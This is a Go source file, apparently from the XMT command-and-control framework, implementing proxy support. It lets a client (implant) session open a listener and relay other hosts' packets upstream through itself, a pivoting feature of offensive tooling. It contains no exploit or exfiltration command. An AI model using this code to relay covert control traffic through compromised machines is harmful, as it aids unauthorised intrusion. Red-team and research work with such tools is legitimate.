//go:build !multiproxy && !noproxy

// Copyright (C) 2020 - 2023 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//

package c2

import (
	"context"

	"github.com/iDigitalFlame/xmt/c2/cfg"
	"github.com/iDigitalFlame/xmt/c2/cout"
	"github.com/iDigitalFlame/xmt/data"
	"github.com/iDigitalFlame/xmt/util/xerr"
)

type proxyBase struct {
	_ [0]func()
	*Proxy
}

// Proxy returns the current Proxy (if enabled). This function take a name
// argument that is a string that specifies the Proxy name.
//
// By default, the name is ignored as multiproxy support is disabled.
//
// When proxy support is disabled, this always returns nil.
func (s *Session) Proxy(_ string) *Proxy {
	if s.proxy == nil {
		return nil
	}
	return s.proxy.Proxy
}
func (s *Session) checkProxyMarshal() bool {
	if s.proxy == nil {
		return true
	}
	_, ok := s.proxy.p.(marshaler)
	return ok
}
func (s *Session) writeProxyData(f bool, w data.Writer) error {
	if !s.IsClient() || !s.IsActive() {
		return nil
	}
	if s.proxy == nil {
		return w.WriteUint8(0)
	}
	if !s.proxy.IsActive() {
		s.proxy = nil
		return w.WriteUint8(0)
	}
	if err := w.WriteUint8(1); err != nil {
		return err
	}
	if err := w.WriteString(s.proxy.name); err != nil {
		return err
	}
	if err := w.WriteString(s.proxy.addr); err != nil {
		return err
	}
	if !f {
		return nil
	}
	p, ok := s.proxy.p.(marshaler)
	if !ok {
		return xerr.Sub("cannot marshal Proxy Profile", 0x54)
	}
	b, err := p.MarshalBinary()
	if err != nil {
		return err
	}
	return w.WriteBytes(b)
}

// NewProxy establishes a new listening Proxy connection using the supplied Profile
// name and bind address that will send any received Packets "upstream" via the
// current Session.
//
// Packets destined for hosts connected to this proxy will be routed back and
// forth on this Session.
//
// This function will return an error if this is not a client Session or
// listening fails.
func (s *Session) NewProxy(name, addr string, p cfg.Profile) (*Proxy, error) {
	if !s.IsClient() {
		return nil, xerr.Sub("must be a client session", 0x4E)
	}
	if s.isMoving() {
		return nil, xerr.Sub("migration in progress", 0x4F)
	}
	// TODO(dij): Need to enable this, but honestly its a lot of work for
	//            something that might have 0 use.
	//
	//            People, if you feel otherwise, put in a GitHub issue plz.
	//
	// NOTE(dij): Build with the "multiproxy" tag to remove this restriction
	if s.proxy != nil {
		return nil, xerr.Sub("only a single Proxy per session can be active", 0x55)
	}
	if p == nil {
		return nil, ErrInvalidProfile
	}
	h, w, t := p.Next()
	if len(addr) > 0 {
		h = addr
	}
	if len(h) == 0 {
		return nil, ErrNoHost
	}
	l, err := p.Listen(s.ctx, h)
	if err != nil {
		return nil, xerr.Wrap("unable to listen", err)
	}
	if l == nil {
		return nil, xerr.Sub("unable to listen", 0x49)
	}
	v := &Proxy{
		ch:         make(chan struct{}),
		name:       name,
		addr:       h,
		close:      make(chan uint32, 8),
		parent:     s,
		clients:    make(map[uint32]*proxyClient),
		listener:   l,
		connection: connection{s: s.s, p: p, w: w, m: s.m, t: t, log: s.log},
	}
	if v.ctx, v.cancel = context.WithCancel(s.ctx); cout.Enabled {
		s.log.Info(`[%s/P] Added Proxy Listener on "%s"!`, s.ID, h)
	}
	s.proxy = &proxyBase{Proxy: v}
	go v.listen()
	return v, nil
}
